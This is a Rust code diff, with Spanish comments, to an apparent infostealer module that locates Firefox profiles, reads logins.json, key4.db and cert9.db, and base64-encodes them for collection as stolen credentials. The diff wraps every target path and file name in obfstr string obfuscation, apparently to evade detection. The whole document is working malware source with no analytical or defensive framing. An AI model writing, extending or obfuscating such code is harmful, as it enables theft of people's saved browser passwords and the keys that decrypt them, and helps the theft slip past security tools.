@@ -5,13 +5,14 @@ use std::path::PathBuf;
 use std::fs;
 use std::io::Write;
 use base64::{engine::general_purpose, Engine as _};
+use obfstr::obfstr;
 
 /// Roba credenciales de Firefox
 pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
     let appdata = get_appdata_roaming().ok_or(StealerError::BrowserNotFound)?;
     
     // Firefox almacena perfiles en: %APPDATA%\Mozilla\Firefox\Profiles
-    let firefox_path = appdata.join(r"Mozilla\Firefox\Profiles");
+    let firefox_path = appdata.join(obfstr!(r"Mozilla\Firefox\Profiles"));
     
     if !firefox_path.exists() {
         return Err(StealerError::BrowserNotFound);
@@ -54,7 +55,7 @@ fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credenti
     let mut credentials = Vec::new();
     
     // Método 1: Intentar logins.json (Firefox antiguas <133)
-    let logins_json = profile_path.join("logins.json");
+    let logins_json = profile_path.join(obfstr!("logins.json"));
     if file_exists(&logins_json) {
         if let Ok(content) = std::fs::read_to_string(&logins_json) {
             if let Ok(creds) = parse_firefox_logins(&content, None) {
@@ -72,18 +73,18 @@ fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credenti
     let mut files_data = Vec::new();
     
     // Leer key4.db (CRÍTICO)
-    if let Ok(data) = fs::read(profile_path.join("key4.db")) {
-        files_data.push(("key4.db", general_purpose::STANDARD.encode(&data)));
+    if let Ok(data) = fs::read(profile_path.join(obfstr!("key4.db"))) {
+        files_data.push((obfstr!("key4.db").to_string(), general_purpose::STANDARD.encode(&data)));
     }
     
     // Leer logins.json (si existe)
-    if let Ok(data) = fs::read(profile_path.join("logins.json")) {
-        files_data.push(("logins.json", general_purpose::STANDARD.encode(&data)));
+    if let Ok(data) = fs::read(profile_path.join(obfstr!("logins.json"))) {
+        files_data.push((obfstr!("logins.json").to_string(), general_purpose::STANDARD.encode(&data)));
     }
     
     // Leer cert9.db (certificados)
-    if let Ok(data) = fs::read(profile_path.join("cert9.db")) {
-        files_data.push(("cert9.db", general_purpose::STANDARD.encode(&data)));
+    if let Ok(data) = fs::read(profile_path.join(obfstr!("cert9.db"))) {
+        files_data.push((obfstr!("cert9.db").to_string(), general_purpose::STANDARD.encode(&data)));
     }
     
     // Si leímos archivos, crear credenciales con los datos
